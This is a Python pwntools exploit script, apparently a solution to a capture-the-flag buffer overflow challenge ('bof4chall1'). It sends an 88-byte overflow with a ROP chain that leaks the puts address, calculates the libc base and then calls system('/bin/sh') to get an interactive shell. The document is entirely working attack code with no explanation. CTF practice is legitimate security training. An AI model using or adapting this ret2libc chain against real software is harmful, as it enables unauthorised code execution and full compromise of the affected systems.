from pwn import *
exe = ELF("bof4chall1")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6") 
p = process(exe.path)
pop_rdi_ret = 0x0000000000401463 

payload = b'a'*88  + p64(pop_rdi_ret) + p64(exe.got['puts']) + p64(exe.plt['puts'])+p64(exe.sym['main']) 

p.sendlineafter(b'> ',b'1') 
p.sendlineafter(b'song: ',b'a')
p.sendlineafter(b'URL: ',payload) 
p.sendlineafter(b'> ',b'3')

leak = u64(p.recvline()[:-1] + b'\x00\x00')
libc.address=leak-528080

payload = b'a'*88  + p64(pop_rdi_ret) +p64(next(libc.search(b'/bin/sh')))+p64(0x000000000040101a)+ p64(libc.sym['system'])

p.sendlineafter(b'> ',b'1') 
p.sendlineafter(b'song: ',b'a')
p.sendlineafter(b'URL: ',payload) 
p.sendlineafter(b'> ',b'3')


p.interactive() 
